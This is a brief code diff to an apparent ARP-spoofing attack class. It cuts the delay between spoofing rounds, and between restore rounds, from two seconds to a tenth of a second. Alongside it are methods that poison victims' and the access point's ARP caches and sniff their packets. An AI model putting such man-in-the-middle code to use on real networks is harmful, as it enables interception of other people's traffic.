@@ -58,13 +58,13 @@ class Attack():
         for v in self.victim:
             self.spoof(v, self.ap)
             self.spoof(self.ap, v)
-        time.sleep(2)
+        time.sleep(0.1)
 
     def ret_arp_spoofing(self):
         for v in self.victim:
             self.restore(v, self.ap)
             self.restore(self.ap, v)
-        time.sleep(2)
+        time.sleep(0.1)
     
     def sniff_packets(self):
         for v in self.victim:
